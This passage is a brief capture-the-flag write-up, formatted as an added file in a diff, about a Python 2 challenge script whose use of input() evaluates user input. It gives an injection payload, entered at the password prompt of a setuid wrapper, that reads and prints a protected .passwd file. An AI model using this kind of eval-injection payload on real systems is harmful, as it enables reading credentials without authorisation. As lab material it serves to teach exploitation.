@@ -1,0 +1,45 @@
+We have the following code: 
+
+    #!/usr/bin/python2
+     
+    import sys
+     
+    def youLose():
+        print "Try again ;-)"
+        sys.exit(1)
+     
+     
+    try:
+        p = input("Please enter password : ")
+    except:
+        youLose()
+     
+     
+    with open(".passwd") as f:
+        passwd = f.readline().strip()
+        try:
+            if (p == int(passwd)):
+                print "Well done ! You can validate with this password !"
+        except:
+            youLose()
+
+
+This program asks the password for showing the password. Therefore the program have access
+to read the passwd file. 
+First, input() hasn't restrictions, therefore we can inject a command.
+In the program, the passwd file is opened with open() and red with readline().
+We can do the same. open(".passwd").readline().
+But, we dont want only execute the command. We need ingress the
+output of the command in the input of the program to obtain the passwd.
+
+We can use sys.stdout.write() to write in stdout the output of the command thah we have injected,
+that is to say the password string. By this way, we give the program what it expects: a string. 
+
+We run the program and it ask the pass:
+
+$ ./setuid-wrapper
+	
+Pleas enter the password: sys.stdout.write(open(".passwd").readline())
+
+And we have the flag!!
+
